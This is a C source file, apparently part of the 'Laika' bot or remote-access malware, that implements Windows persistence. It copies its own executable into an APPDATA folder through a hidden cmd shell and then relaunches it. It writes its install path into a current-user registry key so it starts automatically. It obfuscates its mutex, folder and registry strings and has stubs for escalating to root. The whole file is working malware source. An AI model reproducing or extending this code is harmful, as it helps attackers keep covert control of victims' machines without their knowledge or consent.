/* platform specific code for achieving persistence on windows (FORCES ASCII) */

#include <shlobj.h>
#include <shlwapi.h>
#include <windows.h>

#pragma comment(lib, "Shlwapi.lib")

#include "lbox.h"
#include "lconfig.h"
#include "lerror.h"
#include "lmem.h"
#include "lvm.h"
#include "persist.h"

HANDLE laikaB_mutex;

/* check if laika is running as super-user */
bool laikaB_checkRoot()
{
    return true; /* stubbed for now */
}

/* mark that laika is currently running */
void laikaB_markRunning()
{
    LAIKA_BOX_SKID_START(char *, mutex, LAIKA_WIN_MUTEX);

    laikaB_mutex = OpenMutexA(MUTEX_ALL_ACCESS, false, mutex);

    if (!laikaB_mutex) {
        /* mutex doesn't exist, we're the only laika process :D */
        laikaB_mutex = CreateMutexA(NULL, 0, mutex);
    } else {
        LAIKA_ERROR("Mutex already exists!\n");
    }

    LAIKA_BOX_SKID_END(mutex);
}

/* unmark that laika is currently running */
void laikaB_unmarkRunning()
{
    ReleaseMutex(laikaB_mutex);
}

HKEY openReg(HKEY key, LPCSTR subKey)
{
    HKEY hKey;

    if (RegOpenKeyExA(key, subKey, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        LAIKA_ERROR("Failed to open registry key!\n");

    return hKey;
}

/* returns raw string value from registry  */
LPSTR readReg(HKEY key, LPCSTR val, LPDWORD sz)
{
    LPSTR str = NULL;
    DWORD ret;

    /* get the size */
    *sz = 0;
    RegQueryValueExA(key, val, NULL, NULL, NULL, sz);

    if (*sz != 0) {
        str = (LPSTR)laikaM_malloc(*sz);

        if ((ret = RegQueryValueExA(key, val, NULL, NULL, str, sz)) != ERROR_SUCCESS)
            LAIKA_ERROR("Failed to read registry!\n");
    }

    return str;
}

void writeReg(HKEY key, LPCSTR val, LPSTR data, DWORD sz)
{
    LONG code;

    if ((code = RegSetValueExA(key, val, 0, REG_SZ, (LPBYTE)data, sz)) != ERROR_SUCCESS)
        LAIKA_ERROR("Failed to write registry!\n");
}

void getExecutablePath(LPSTR path)
{
    CHAR modulePath[MAX_PATH] = {0};
    if (GetModuleFileNameA(NULL, modulePath, MAX_PATH) == 0)
        LAIKA_ERROR("Failed to get executable path!\n");

    lstrcpyA(path, "\"");
    lstrcatA(path, modulePath);
    lstrcatA(path, "\"");

    LAIKA_DEBUG("EXE: %s\n", path);
}

void getInstallPath(LPSTR path)
{
    LAIKA_BOX_SKID_START(char *, instDir, LAIKA_WIN_INSTALL_DIR);
    LAIKA_BOX_SKID_START(char *, instFile, LAIKA_WIN_INSTALL_FILE);
    CHAR SHpath[MAX_PATH] = {0};

    /* SHGetFolderPath is deprecated but,,,,, it's still here for backwards compatibility and
     * microsoft will probably never completely remove it :P */
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, SHpath) != S_OK)
        LAIKA_ERROR("Failed to get APPDATA!\n");

    PathAppendA(SHpath, instDir);

    if (!CreateDirectoryA(SHpath, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
        LAIKA_ERROR("Failed to create directory '%s'!\n", SHpath);

    PathAppendA(SHpath, instFile);

    /* write to path */
    lstrcpyA(path, "\"");
    lstrcatA(path, SHpath);
    lstrcatA(path, "\"");

    LAIKA_DEBUG("INSTALL: %s\n", path);

    LAIKA_BOX_SKID_END(instFile);
    LAIKA_BOX_SKID_END(instDir);
}

/* windows doesn't let you move/delete/modify any currently executing file (since a file handle to
   the executable is open), so we spawn a shell to move the exe *after* we exit. */
void installSelf()
{
    CHAR szFile[MAX_PATH] = {0}, szInstall[MAX_PATH] = {0}, szCmd[(MAX_PATH * 4)] = {0};

    getExecutablePath(szFile);
    getInstallPath(szInstall);

    if (lstrcmpA(szFile, szInstall) == 0) {
        LAIKA_DEBUG("Laika already installed!\n");
        return;
    }

    LAIKA_DEBUG("moving '%s' to '%s'!\n", szFile, szInstall);

    /* wait for 3 seconds (so our process has time to exit) & move the exe, then restart laika
    *  TODO: move this string to a secret box */
    lstrcpyA(szCmd, "/C timeout /t 3 > NUL & move /Y ");
    lstrcatA(szCmd, szFile);
    lstrcatA(szCmd, " ");
    lstrcatA(szCmd, szInstall);
    lstrcatA(szCmd, " > NUL & ");
    lstrcatA(szCmd, szInstall);

    if (GetEnvironmentVariableA("COMSPEC", szFile, MAX_PATH) == 0 ||
        (INT)ShellExecuteA(NULL, NULL, szFile, szCmd, NULL, SW_HIDE) <= 32)
        LAIKA_ERROR("Failed to start shell for moving exe!\n");

    laikaB_unmarkRunning();
    exit(0);
}

void installRegistry()
{
    LAIKA_BOX_SKID_START(char *, regKey, LAIKA_WIN_REG_KEY);
    LAIKA_BOX_SKID_START(char *, regKeyVal, LAIKA_WIN_REG_VAL);
    CHAR newRegValue[MAX_PATH] = {0};
    LPSTR regVal;
    DWORD regSz;
    DWORD newRegSz;
    HKEY reg;

    /* create REG_MULTI_SZ */
    getInstallPath(newRegValue);
    newRegSz = lstrlenA(newRegValue);

    reg = openReg(HKEY_CURRENT_USER, regKey);
    if ((regVal = readReg(reg, regKeyVal, &regSz)) != NULL) {
        LAIKA_DEBUG("Current Registry value: '%s'\n", regVal);

        /* compare regValue with the install path we'll need */
        if (regSz != newRegSz || memcmp(newRegValue, regVal, regSz) != 0) {
            LAIKA_DEBUG("No match! Updating registry...\n");
            /* it's not our install path, so write it */
            writeReg(reg, regKeyVal, newRegValue, newRegSz);
        }

        laikaM_free(regVal);
    } else {
        LAIKA_DEBUG("Empty registry! Updating registry...\n");
        /* no registry value set! install it and set! */
        writeReg(reg, regKeyVal, newRegValue, newRegSz);
    }

    RegCloseKey(reg);
    LAIKA_BOX_SKID_END(regKeyVal);
    LAIKA_BOX_SKID_END(regKey);
}

/* try to gain persistance on machine */
void laikaB_tryPersist()
{
    installRegistry();
    installSelf();
}

/* try to gain root */
void laikaB_tryRoot()
{
    /* stubbed */
}